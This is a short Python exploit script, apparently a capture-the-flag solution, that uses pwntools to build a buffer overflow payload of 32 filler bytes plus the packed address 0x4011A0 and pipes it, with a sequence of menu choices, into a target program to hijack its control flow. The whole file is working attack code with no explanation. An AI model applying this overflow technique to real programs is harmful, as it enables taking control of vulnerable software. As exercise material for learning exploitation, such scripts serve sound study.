
from sys import stdout
from pwn import p32

def send(payload):
  stdout.buffer.write(payload)


payload = b'A' * 32 + p32(0x4011A0)

send(b"2\n")
send(payload + b"\n")
send(b"1\n")
send(b"3\n")
send(b"4\n")



